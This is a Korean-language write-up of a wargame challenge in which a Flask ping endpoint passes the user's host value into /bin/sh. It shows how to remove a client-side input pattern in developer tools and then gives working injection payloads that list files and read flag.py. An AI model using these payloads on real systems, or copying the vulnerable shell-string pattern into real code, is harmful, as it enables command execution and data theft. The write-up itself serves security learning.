# Command-Injection-1
이번 문제는 Command Injection이 존재하는 워게임 문제인 Command Injection-1 을 풀어본다.
목표는 대상 호스트 내에 존재한 flag.py 파일 내의 flag를 회득하는 것이다. `/ping` 엔드포인트에서는 핑을 특정호스트에 ping 패킷을 보내는 기능을 제공하고 있음을 확인할 수 있다.
```python
@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')
```
subprocess.check_output 함수를 이용해 /bin/sh에서 cmd 명령을 실행시키고, 결과 출력변수 output에 저장한다 
1. 명령어 실행중 예외 발생하지 않으면 결과 출력을 utf-8로 디코딩 후에 ping_result.html 템플릿과 함께 렌더링후에 반환
2. 명령 실행후 5초를 초과하면 subprocess.TimeoutExpried 예외 발생 Timeout ! 출력
3. 실행 오류 발생시 subprocess.CalledProcessError 예외 발생, 해당 오류 메시지 출력

```
127.0.0.1"; ls #
```
이렇게 핑을 보내면 요청한 형식과 일치시키세요.라는 문자열이 발생되며 ping을 보내지 못하게 되는데 개발자 도구를 통해 핑을 보내는 부분에  input태그의 pattern 속성이 설정되어있음을 확인했다. 사용가능한 정규 표현식은 대소문자 영어, 숫자, `.`, 글자 수 5~20자 가 가능하다
`<input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required="">`
하지만 이 필터링은 서버단에서 일어나는 검증이 아닌, 클라이언트 단에서 일어나는 검증이기 때문에 필터링 우회가 가능하다

`<input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" required="">` 
이렇게 pattern 속성을 지워준다.

</br>

문제에 의하면 flag.py라는 파일이 있다는데 그것을 확인하기 위해서 다시 127.0.0.1"; ls # 를 실행 시켜준다. 아래는 실행 시킨 후의 출력된 결과이다.

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.029 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.030 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.034 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.029/0.031/0.034 ms
__pycache__
app.py
flag.py
requirements.txt
static
templates
```
flag.py 파일이 보인다! 저 파일을 그대로 읽기 위해서 cat 명령어를 사용한다
s
```
127.0.0.1"; cat flag.py # 

PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.024 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.047 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.033 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.024/0.034/0.047 ms
FLAG = 'DH{flag!!!!!!!!!!!!!!!!!!!!!!}'
```
